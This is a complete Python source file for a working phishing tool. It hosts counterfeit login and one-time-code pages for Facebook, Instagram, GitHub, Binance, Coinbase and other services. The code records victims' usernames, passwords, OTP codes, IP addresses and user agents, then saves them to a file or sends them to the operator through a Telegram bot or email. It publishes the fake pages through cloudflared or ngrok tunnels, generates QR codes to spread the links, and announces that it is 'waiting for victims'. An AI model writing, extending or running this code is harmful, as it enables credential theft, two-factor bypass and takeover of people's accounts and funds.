#!/usr/bin/env python3

import os
import json
import datetime
import subprocess
import requests
import qrcode
from flask import Flask, request, render_template, redirect, session, jsonify
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
import threading
import time
import socket
import select
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from jinja2 import FileSystemLoader
import re

console = Console()

class SocialPhisher:
    def __init__(self):
        self.templates_base = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')
        self.app = Flask(__name__, 
                        template_folder=self.templates_base,
                        static_folder=os.path.join(os.path.dirname(os.path.dirname(__file__)), 'static'))
        self.app.secret_key = os.urandom(24)  # For session management
        self.templates_dir = os.path.join(self.templates_base, 'social')
        self.output_dir = 'output/harvested'
        self.qr_dir = 'output/qrcodes'
        self.harvested_data = []
        self.settings = {}
        self.selected_platform = None  # Track the selected platform
        self._ensure_directories()
        self.setup_routes()
        self.server_thread = None
        self.cloudflared_process = None
        self.ngrok_process = None
        self.use_otp = False
        
        # Register template directory
        self.app.jinja_loader = FileSystemLoader(self.templates_base)

    def _ensure_directories(self):
        """Ensure all required directories exist."""
        # Create main directories
        os.makedirs(self.templates_dir, exist_ok=True)
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.qr_dir, exist_ok=True)
        
        # Create platform-specific directories for all supported platforms
        platforms = [
            'facebook', 'instagram', 'twitter', 'linkedin', 'tiktok', 'snapchat',
            'github', 'binance', 'telegram', 'pinterest', 'reddit', 'coinbase'
        ]
        for platform in platforms:
            platform_dir = os.path.join(self.templates_dir, platform)
            os.makedirs(platform_dir, exist_ok=True)
            # Ensure index.html exists
            index_file = os.path.join(platform_dir, 'index.html')
            if not os.path.exists(index_file):
                console.print(f"[yellow]Warning: {index_file} template missing[/yellow]")

    def setup_routes(self):
        """Setup Flask routes."""
        
        @self.app.route('/')
        def index():
            platform = request.args.get('platform')
            template_type = request.args.get('type', 'index')  # Can be 'index' or 'otp'
            
            # If we have a selected platform and no platform in URL, use the selected one
            if not platform and self.selected_platform:
                platform = self.selected_platform
            
            if not platform:
                # Show a list of available platforms instead of error
                platforms = [
                    'facebook', 'instagram', 'twitter', 'linkedin', 'tiktok', 'snapchat',
                    'github', 'binance', 'telegram', 'pinterest', 'reddit', 'coinbase', 'messenger'
                ]
                return render_template('social/error.html', 
                                    error="Select a Platform",
                                    message="Available platforms: " + ", ".join(platforms))
            
            try:
                # Construct template path based on type
                template_path = f'social/{platform}/{template_type}.html'
                
                # Check if template exists
                if not os.path.exists(os.path.join(self.templates_base, template_path)):
                    return render_template('social/error.html',
                                        error=f"Template '{template_path}' not found",
                                        message="The requested template is not available.")
                
                # Store the platform if it's valid and we don't have one selected yet
                if not self.selected_platform:
                    self.selected_platform = platform
                
                # Render the template
                return render_template(template_path, platform=platform)
                
            except Exception as e:
                console.print(f"[red]Error loading template: {str(e)}[/red]")
                return render_template('social/error.html',
                                    error="Internal Server Error",
                                    message=str(e))

        @self.app.route('/social/<platform>/<template>', methods=['GET'])
        def serve_social_template(platform, template):
            try:
                # Handle both cases: with and without .html extension
                if not template.endswith('.html'):
                    template += '.html'
                
                template_path = f'social/{platform}/{template}'
                
                # Check if template exists
                template_file = os.path.join(self.templates_base, template_path)
                if not os.path.exists(template_file):
                    return render_template('social/error.html',
                                        error=f"Template '{template_path}' not found",
                                        message="The requested template is not available.")
                
                # Store the platform
                self.selected_platform = platform
                
                # Render the template
                return render_template(template_path, platform=platform)
                
            except Exception as e:
                console.print(f"[red]Error loading template: {str(e)}[/red]")
                return render_template('social/error.html',
                                    error="Internal Server Error",
                                    message=str(e))

        @self.app.route('/login', methods=['POST'])
        def login():
            platform = request.args.get('platform')
            if not platform:
                return jsonify({"error": "No platform specified"}), 400
                
            data = request.form.to_dict()
            data['platform'] = platform
            data['timestamp'] = datetime.datetime.now().isoformat()
            data['ip'] = request.remote_addr
            data['user_agent'] = request.headers.get('User-Agent')
            
            # Process the harvested data
            self.process_harvested_data(data, platform)
            
            # Always return OTP template info for two-factor flow
            return jsonify({
                'status': 'success',
                'require_otp': True,
                'otp_template': f'social/{platform}/otp.html'
            })

        @self.app.route('/verify', methods=['POST'])
        def verify():
            try:
                platform = request.args.get('platform', 'unknown')
                data = request.get_json() if request.is_json else request.form.to_dict()
                
                if not data:
                    return jsonify({'status': 'error', 'message': 'No data received'})
                
                # Add platform info to the data
                data['platform'] = platform
                data['timestamp'] = datetime.datetime.now().isoformat()
                data['ip'] = request.remote_addr
                data['user_agent'] = request.headers.get('User-Agent')
                
                # Process the OTP data
                self.process_harvested_data(data, platform)
                
                # Get the appropriate redirect URL
                redirect_url = self.get_redirect_url(platform)
                
                # Return JSON response
                return jsonify({
                    'status': 'success',
                    'redirect_url': redirect_url
                })
                
            except Exception as e:
                console.print(f"[red]Error processing OTP: {str(e)}[/red]")
                return jsonify({'status': 'error', 'message': str(e)})

    def get_redirect_url(self, platform):
        """Get the appropriate redirect URL for each platform."""
        redirect_urls = {
            'github': 'https://github.com/login',
            'binance': 'https://accounts.binance.com/en/login',
            'telegram': 'https://web.telegram.org/',
            'linkedin': 'https://www.linkedin.com/login',
            'twitter': 'https://twitter.com/login',
            'tiktok': 'https://www.tiktok.com/login',
            'pinterest': 'https://www.pinterest.com/login',
            'reddit': 'https://www.reddit.com/login',
            'coinbase': 'https://www.coinbase.com/signin',
            'facebook': 'https://www.facebook.com/login',
            'instagram': 'https://www.instagram.com/login',
            'snapchat': 'https://accounts.snapchat.com/accounts/login'
        }
        return redirect_urls.get(platform.lower(), 'https://www.google.com')

    def process_harvested_data(self, data, platform):
        """Process and save harvested credentials."""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Format the data based on type (login or OTP)
        if 'otp' in data:
            # Handle OTP data
            message = f"""
[OTP] {platform.upper()} - {timestamp}
OTP Code: {data['otp']}
--------------------------------------------------"""
            console.print(f"[green]✓ Received OTP from {platform.upper()}![/green]")
        else:
            # Handle login credentials
            email = data.get('email', data.get('username', data.get('login', '')))
            password = data.get('password', '')
            message = f"""
[LOGIN] {platform.upper()} - {timestamp}
Email/Username: {email}
Password: {password}
--------------------------------------------------"""
            console.print(f"[green]✓ Received login credentials from {platform.upper()}![/green]")

        # Save to file
        self.save_to_file(message)
        console.print("[blue]→ Saved to file[/blue]")

        # Send to Telegram if configured
        if self.settings.get('output_method') == 'telegram' and self.settings.get('telegram_bot_token'):
            self.send_to_telegram(message)
            console.print("[blue]→ Sent to Telegram[/blue]")

        # Send email if configured
        if self.settings.get('output_method') == 'email' and self.settings.get('email_address'):
            subject = f"{platform.upper()} {'OTP' if 'otp' in data else 'Credentials'} Captured"
            self.send_email_notification(subject, message)
            console.print("[blue]→ Sent to Email[/blue]")

        return {'status': 'success'}

    def save_to_file(self, data):
        """Save data to file."""
        filename = os.path.join('output', 'harvested', 'social_credentials.txt')
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        
        with open(filename, 'a') as f:
            f.write(data)

    def send_to_telegram(self, message):
        """Send data to Telegram."""
        bot_token = self.settings.get('telegram_bot_token')
        chat_id = self.settings.get('telegram_chat_id')
        
        if not bot_token or not chat_id:
            return
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        try:
            requests.post(url, json=data)
        except Exception as e:
            console.print(f"[red]Failed to send to Telegram: {str(e)}[/red]")

    def send_email_notification(self, subject, body):
        """Send data via email."""
        smtp_server = self.settings.get('email_smtp_server')
        smtp_port = self.settings.get('email_smtp_port')
        email = self.settings.get('email_address')
        password = self.settings.get('email_password')
        notification_email = self.settings.get('notification_email')
        
        if not all([smtp_server, smtp_port, email, password, notification_email]):
            return
        
        try:
            msg = MIMEMultipart()
            msg['Subject'] = subject
            msg['From'] = email
            msg['To'] = notification_email
            msg.attach(MIMEText(body, 'plain'))
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(email, password)
                server.send_message(msg)
        except Exception as e:
            console.print(f"[red]Failed to send email: {str(e)}[/red]")

    def generate_qr_code(self, url, platform):
        """Generate and display QR code for the phishing URL."""
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=2,
        )
        qr.add_data(url)
        qr.make(fit=True)

        # Save QR code
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = os.path.join(self.qr_dir, f'social_{platform}_{timestamp}.png')
        qr_image = qr.make_image(fill_color="black", back_color="white")
        qr_image.save(output_path, quality=95)

        # Display in console
        console.print("\n[bold white]Scan this QR code to share:[/bold white]")
        console_qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=0.5,
            border=0,
        )
        console_qr.add_data(url)
        console_qr.make(fit=True)
        console_qr.print_ascii(invert=True)
        
        console.print(f"[green]QR code saved as: {output_path}[/green]")

    def start_server(self, host='0.0.0.0', port=8080):
        """Start the Flask server."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((host, port))
                s.close()
            
            console.print(f"[green]Starting server on {host}:{port}...[/green]")
            self.app.run(host=host, port=port, debug=False)
        except Exception as e:
            console.print(f"[red]Failed to start server: {str(e)}[/red]")
            raise e

    def start_cloudflared(self, port, platform):
        """Start cloudflared tunnel."""
        try:
            # First, thoroughly clean up any existing cloudflared processes
            cleanup_commands = [
                ['pkill', '-9', 'cloudflared'],  # Force kill any cloudflared process
                ['killall', '-9', 'cloudflared'],  # Alternative kill command
                ['rm', '-f', '/tmp/.cloudflared.lock']  # Remove any lock files
            ]
            
            for cmd in cleanup_commands:
                try:
                    subprocess.run(cmd, stderr=subprocess.DEVNULL)
                except Exception:
                    pass
            
            # Wait to ensure processes are fully terminated
            time.sleep(3)
            
            # Double check no cloudflared is running
            ps_check = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            if 'cloudflared tunnel' in ps_check.stdout:
                console.print("[yellow]Waiting for existing cloudflared processes to terminate...[/yellow]")
                time.sleep(2)
                subprocess.run(['pkill', '-9', 'cloudflared'], stderr=subprocess.DEVNULL)
                time.sleep(1)
            
            console.print("[yellow]Starting new cloudflared tunnel...[/yellow]")
            
            # Check cloudflared version first
            try:
                version_check = subprocess.run(['cloudflared', '--version'], 
                                            capture_output=True, 
                                            text=True)
                console.print(f"[green]Cloudflared version: {version_check.stdout.strip()}[/green]")
            except Exception as e:
                console.print(f"[red]Error checking cloudflared version: {str(e)}[/red]")
                console.print("[yellow]Attempting to continue anyway...[/yellow]")
            
            # Start cloudflared with explicit port binding
            process = subprocess.Popen(
                [
                    'cloudflared', 'tunnel',
                    '--url', f'http://127.0.0.1:{port}',
                    '--metrics', 'localhost:0',  # Use dynamic port for metrics
                    '--no-autoupdate',
                    '--protocol', 'http2'
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1
            )
            
            start_time = time.time()
            timeout = 60
            url_found = False
            output_buffer = []
            
            console.print("[yellow]Waiting for tunnel to be established...[/yellow]")
            
            while (time.time() - start_time) < timeout and not url_found:
                if process.poll() is not None:
                    console.print("[red]Cloudflared process terminated unexpectedly[/red]")
                    if process.stderr:
                        error = process.stderr.readline().strip()
                        if error:
                            console.print(f"[red]Last error: {error}[/red]")
                    break
                
                try:
                    # Check stderr for errors
                    if process.stderr in select.select([process.stderr], [], [], 0)[0]:
                        error = process.stderr.readline().strip()
                        if error:
                            console.print(f"[yellow]Cloudflared message: {error}[/yellow]")
                    
                    # Check stdout for URL and other messages
                    if process.stdout in select.select([process.stdout], [], [], 0)[0]:
                        line = process.stdout.readline().strip()
                        if line:
                            output_buffer.append(line)
                            console.print(f"[dim]{line}[/dim]")
                            
                            if "trycloudflare.com" in line:
                                words = line.split()
                                for word in words:
                                    if 'trycloudflare.com' in word:
                                        url = word.strip()
                                        url = url.strip('|').strip()
                                        if not url.startswith('http'):
                                            url = 'https://' + url
                                        # Append platform parameter to URL
                                        url = f"{url}?platform={platform}"
                                        console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                                        console.print(f"[bold green]Public URL: {url}[/bold green]")
                                        console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
                                        
                                        # Generate QR code for the URL
                                        self.generate_qr_code(url, platform)
                                        
                                        self.cloudflared_process = process
                                        url_found = True
                                        return True
                            
                            # Alternative URL format detection
                            if "Your quick Tunnel has been created!" in line:
                                for _ in range(5):
                                    url_line = process.stdout.readline().strip()
                                    if url_line:
                                        output_buffer.append(url_line)
                                        console.print(f"[dim]{url_line}[/dim]")
                                        if 'trycloudflare.com' in url_line:
                                            words = url_line.split()
                                            for word in words:
                                                if 'trycloudflare.com' in word:
                                                    url = word.strip()
                                                    if not url.startswith('http'):
                                                        url = 'https://' + url
                                                    # Append platform parameter to URL
                                                    url = f"{url}?platform={platform}"
                                                    console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                                                    console.print(f"[bold green]Public URL: {url}[/bold green]")
                                                    console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
                                                    
                                                    # Generate QR code for the URL
                                                    self.generate_qr_code(url, platform)
                                                    self.cloudflared_process = process
                                                    url_found = True
                                                    return True
                except Exception as e:
                    console.print(f"[red]Error reading cloudflared output: {str(e)}[/red]")
                
                time.sleep(0.1)
            
            # If we get here, we didn't find the URL
            console.print("[red]Failed to establish cloudflared tunnel. Debug information:[/red]")
            console.print("[yellow]Last few lines of output:[/yellow]")
            for line in output_buffer[-5:]:
                console.print(f"[dim]{line}[/dim]")
            
            if process.poll() is None:
                process.terminate()
            return False
            
        except FileNotFoundError:
            console.print("[red]Error: cloudflared not found. Installing now...[/red]")
            try:
                # Download and install cloudflared
                subprocess.run([
                    'curl', '-L', '--output', 'cloudflared.deb',
                    'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb'
                ], check=True)
                subprocess.run(['sudo', 'dpkg', '-i', 'cloudflared.deb'], check=True)
                subprocess.run(['rm', 'cloudflared.deb'], check=True)
                console.print("[green]Cloudflared installed successfully. Please try again.[/green]")
                return False
            except Exception as e:
                console.print(f"[red]Failed to install cloudflared: {str(e)}[/red]")
                return False
        except Exception as e:
            console.print(f"[red]Error starting cloudflared: {str(e)}[/red]")
            return False

    def configure_ngrok(self):
        """Configure ngrok with the saved token."""
        if self.settings.get('ngrok_token'):
            try:
                subprocess.run(['ngrok', 'config', 'add-authtoken', self.settings['ngrok_token']], 
                             capture_output=True,
                             text=True)
                console.print("[green]Ngrok configured with saved token[/green]")
                return True
            except Exception as e:
                console.print(f"[red]Error configuring ngrok: {str(e)}[/red]")
                return False
        return False

    def start_ngrok(self, port, platform):
        """Start ngrok tunnel."""
        try:
            console.print("[yellow]Starting ngrok tunnel...[/yellow]")
            
            # Configure ngrok with saved token if available
            self.configure_ngrok()
            
            # Check if ngrok is installed and configured
            try:
                version_check = subprocess.run(['ngrok', '--version'], 
                                            capture_output=True, 
                                            text=True)
                console.print(f"[green]Ngrok version: {version_check.stdout.strip()}[/green]")
            except Exception as e:
                console.print(f"[red]Error checking ngrok: {str(e)}[/red]")
                console.print("[yellow]Please ensure ngrok is installed and configured properly[/yellow]")
                return False
            
            # Kill any existing ngrok processes
            subprocess.run(['pkill', 'ngrok'], stderr=subprocess.DEVNULL)
            time.sleep(1)
            
            process = subprocess.Popen(
                [
                    'ngrok', 'http',
                    '--log=stdout',
                    str(port)
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1
            )
            
            max_attempts = 30
            attempt = 0
            url_found = False
            
            while attempt < max_attempts and not url_found:
                try:
                    response = requests.get('http://127.0.0.1:4040/api/tunnels')
                    if response.status_code == 200:
                        tunnels = response.json()['tunnels']
                        if tunnels:
                            url = tunnels[0]['public_url']
                            # Append platform parameter to URL
                            url = f"{url}?platform={platform}"
                            console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                            console.print(f"[bold green]Public URL: {url}[/bold green]")
                            console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
                            
                            # Generate QR code for the URL
                            self.generate_qr_code(url, platform)
                            
                            self.ngrok_process = process
                            url_found = True
                            
                            # Display waiting message
                            console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
                            console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
                            return True
                except requests.exceptions.ConnectionError:
                    console.print(f"[yellow]Waiting for ngrok to start (attempt {attempt + 1}/{max_attempts})[/yellow]")
                    attempt += 1
                    time.sleep(1)
                    continue
                except Exception as e:
                    console.print(f"[red]Error connecting to ngrok API: {str(e)}[/red]")
                    attempt += 1
                    time.sleep(1)
                    continue
            
            if process.poll() is None:
                process.terminate()
            console.print("[red]Failed to get ngrok URL after maximum attempts[/red]")
            return False
            
        except Exception as e:
            console.print(f"[red]Error starting ngrok: {str(e)}[/red]")
            if process and process.poll() is None:
                process.terminate()
            return False

    def stop_tunnels(self):
        """Stop all running tunnels."""
        if self.cloudflared_process:
            self.cloudflared_process.terminate()
            self.cloudflared_process = None
        if self.ngrok_process:
            self.ngrok_process.terminate()
            self.ngrok_process = None

    def load_settings(self):
        """Load settings from config file."""
        try:
            config_file = os.path.join('config', 'landing_settings.json')
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.settings = json.load(f)
                console.print("[green]Settings loaded successfully[/green]")
            else:
                console.print("[yellow]No settings file found, using defaults[/yellow]")
                self.settings = {
                    'output_method': 'file',
                    'output_file': os.path.join('output', 'harvested', 'social_credentials.txt')
                }
        except Exception as e:
            console.print(f"[red]Error loading settings: {str(e)}[/red]")
            self.settings = {
                'output_method': 'file',
                'output_file': os.path.join('output', 'harvested', 'social_credentials.txt')
            }

    def configure_output(self):
        """Configure output methods based on settings."""
        output_method = self.settings.get('output_method', 'file')
        
        if output_method == 'telegram':
            if not self.settings.get('telegram_bot_token') or not self.settings.get('telegram_chat_id'):
                console.print("[yellow]Telegram settings incomplete, falling back to file output[/yellow]")
                self.settings['output_method'] = 'file'
            else:
                console.print("[green]Telegram output configured[/green]")
        
        elif output_method == 'email':
            required_fields = ['email_smtp_server', 'email_smtp_port', 'email_address', 
                             'email_password', 'notification_email']
            if not all(self.settings.get(field) for field in required_fields):
                console.print("[yellow]Email settings incomplete, falling back to file output[/yellow]")
                self.settings['output_method'] = 'file'
            else:
                console.print("[green]Email output configured[/green]")
        
        console.print(f"[blue]Output method: {self.settings['output_method']}[/blue]")

    def _wait_for_server(self, port, timeout=10):
        """Wait for the server to start."""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect(('localhost', port))
                    return True
            except:
                time.sleep(0.1)
        return False

    def _find_available_port(self, start_port=8080, max_attempts=100):
        """Find an available port to use."""
        port = start_port
        while port < start_port + max_attempts:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(('', port))
                    return port
            except OSError:
                port += 1
        raise RuntimeError("No available ports found")

    def run(self):
        """Run the social phishing module."""
        # Load settings first
        self.load_settings()
        
        # Show platform options
        console.print("\nSelect target platform:")
        console.print("1. Facebook")
        console.print("2. Instagram")
        console.print("3. Twitter")
        console.print("4. TikTok")
        console.print("5. Snapchat")
        console.print("6. GitHub")
        console.print("7. Binance")
        console.print("8. Telegram")
        console.print("9. Pinterest")
        console.print("10. Reddit")
        console.print("11. Coinbase")
        console.print("12. LinkedIn")
        
        choice = Prompt.ask("Select platform", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12"])
        
        # Map choices to platform names
        platform_map = {
            "1": "facebook",
            "2": "instagram",
            "3": "twitter",
            "4": "tiktok",
            "5": "snapchat",
            "6": "github",
            "7": "binance",
            "8": "telegram",
            "9": "pinterest",
            "10": "reddit",
            "11": "coinbase",
            "12": "linkedin"
        }
        
        self.selected_platform = platform_map[choice]
        console.print(f"\n[green]Selected platform: {self.selected_platform.upper()}[/green]")
        
        # Check if OTP template exists and ask user if they want to use it
        otp_template = os.path.join(self.templates_dir, self.selected_platform, 'otp.html')
        if os.path.exists(otp_template):
            use_otp = Prompt.ask("Enable OTP verification?", choices=["y", "n"], default="n")
            self.use_otp = use_otp.lower() == "y"
            if self.use_otp:
                console.print("[green]OTP verification enabled[/green]")
        
        # Find available port
        port = self._find_available_port()
        console.print(f"[green]Found available port: {port}[/green]")
        
        # Start the Flask server in a separate thread
        server_thread = threading.Thread(
            target=self.start_server,
            kwargs={'port': port}
        )
        server_thread.daemon = True
        server_thread.start()
        
        # Wait for server to be ready
        if not self._wait_for_server(port):
            console.print("[red]Failed to start server[/red]")
            return
            
        console.print(f"[green]Server started successfully on port {port}[/green]")
        
        # Ask user which tunnel service to use
        console.print("\nSelect tunneling service:")
        console.print("1. Cloudflared")
        console.print("2. Ngrok")
        tunnel_choice = Prompt.ask("Choose tunnel service", choices=["1", "2"], default="1")
        
        try:
            if tunnel_choice == "1":
                # Try cloudflared
                console.print("[yellow]Starting Cloudflared tunnel...[/yellow]")
                if self.start_cloudflared(port, self.selected_platform):
                    console.print("[green]Cloudflared tunnel started successfully[/green]")
                    console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
                    console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
                else:
                    console.print("[red]Failed to start Cloudflared tunnel[/red]")
                    return
            else:
                # Try ngrok
                if not self.start_ngrok(port, self.selected_platform):
                    console.print("[red]Failed to start Ngrok tunnel[/red]")
                    return
                    
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                console.print("\n[yellow]Stopping server...[/yellow]")
                self.stop_tunnels()
                console.print("[green]Server stopped successfully[/green]")
                
        except Exception as e:
            console.print(f"[red]Error: {str(e)}[/red]")
            self.stop_tunnels() 